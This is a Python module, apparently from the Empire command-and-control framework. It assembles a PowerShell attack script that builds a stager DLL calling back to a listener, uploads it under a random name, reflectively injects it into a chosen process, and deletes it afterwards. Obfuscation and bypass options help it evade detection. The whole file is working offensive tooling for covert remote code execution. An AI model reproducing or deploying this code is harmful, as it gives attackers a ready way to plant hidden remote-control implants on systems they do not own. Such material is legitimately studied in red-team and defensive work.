from __future__ import print_function

import random
import string
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # Set booleans to false by default
        obfuscate = False

        def rand_text_alphanumeric(size=15, chars=string.ascii_uppercase + string.digits):
            return ''.join(random.choice(chars) for _ in range(size))
        
        fname = rand_text_alphanumeric() + ".dll"
        listener_name = params['Listener']
        proc_name = params['ProcName'].strip()
        upload_path = params['UploadPath'].strip()
        arch = params['Arch'].strip()
        full_upload_path = upload_path + "\\" + fname
        
        if proc_name == '':
            return handle_error_message("[!] ProcName must be specified.")

        # staging options
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']

        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
        if obfuscate:
            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        module_code = f.read()
        f.close()
        
        script = module_code
        script_end = ""
        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: %s" % (listener_name))
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                           obfuscate=obfuscate,
                                                           obfuscationCommand=obfuscate_command, userAgent=user_agent,
                                                           proxy=proxy,
                                                           proxyCreds=proxy_creds, bypasses=params['Bypasses'])
            
            if launcher == '':
                return handle_error_message('[!] Error in launcher generation.')
            else:
                launcher_code = launcher.split(' ')[-1]
                
                script_end += "Invoke-ReflectivePEInjection -PEPath %s -ProcName %s " % (full_upload_path, proc_name)
                
                dll = main_menu.stagers.generate_dll(launcher_code, arch)
                
                upload_script = main_menu.stagers.generate_upload(dll, full_upload_path)

                if obfuscate:
                    script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end,
                                                  obfuscationCommand=obfuscation_command)
                
                script += "\r\n"
                script += upload_script
                script += "\r\n"
                script += script_end
                script += "\r\n"
                script += "Remove-Item -Path %s" % full_upload_path
                script = data_util.keyword_obfuscation(script)

                return script
